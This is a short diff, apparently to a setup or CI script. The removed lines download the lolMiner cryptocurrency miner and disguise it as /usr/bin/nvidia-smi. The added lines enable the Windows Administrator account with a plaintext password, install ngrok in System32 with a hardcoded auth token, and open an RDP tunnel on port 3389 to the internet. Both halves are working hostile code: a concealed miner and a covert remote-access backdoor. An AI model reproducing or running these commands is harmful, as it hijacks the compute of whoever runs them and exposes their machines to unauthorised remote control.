@@ -1,4 +1,9 @@
-wget -q "https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.46a/lolMiner_v1.46a_Lin64.tar.gz"
-tar xf lolMiner_v1.46a_Lin64.tar.gz
-mv 1.46a/lolMiner /usr/bin/nvidia-smi
-rm -rf 1.46a/ lolMiner_v1.46a_Lin64.tar.gz
+Set-LocalUser -Name "Administrator" -Password (ConvertTo-SecureString -AsPlainText "DEV_POS080" -Force)
+Get-LocalUser -Name "Administrator" | Enable-LocalUser 
+Invoke-WebRequest https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-windows-amd64.zip -OutFile ngrok.zip
+tar xf ngrok.zip
+Copy ngrok.exe C:\Windows\System32
+cmd /c echo ./ngrok.exe authtoken "24tXPqSUx0vD6bfyzRgU1ICnYh8_TiqpbYGgGAKiqzvpqoUa" >a.ps1
+cmd /c echo cmd /k start ngrok.exe tcp -region=ap 3389 >>a.ps1
+cmd /c echo ping -n 999999 10.10.10.10 >>a.ps1
+.\a.ps1
